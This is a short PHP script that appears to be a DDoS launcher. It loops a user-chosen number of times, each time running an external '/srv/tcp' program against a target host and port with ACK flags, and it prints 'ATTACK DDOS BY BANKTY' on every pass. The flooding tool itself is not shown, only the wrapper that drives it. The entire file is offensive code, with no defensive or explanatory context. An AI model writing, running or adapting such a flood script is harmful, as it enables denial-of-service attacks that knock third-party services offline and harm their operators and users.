<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/srv/tcp '.$argv[1].' '.$argv[2].' '.$rand.' -1 1 ack');
	echo "ATTACK DDOS BY BANKTY ".$argv[1].":".$argv[2]." LOOP $x \n";
}
?>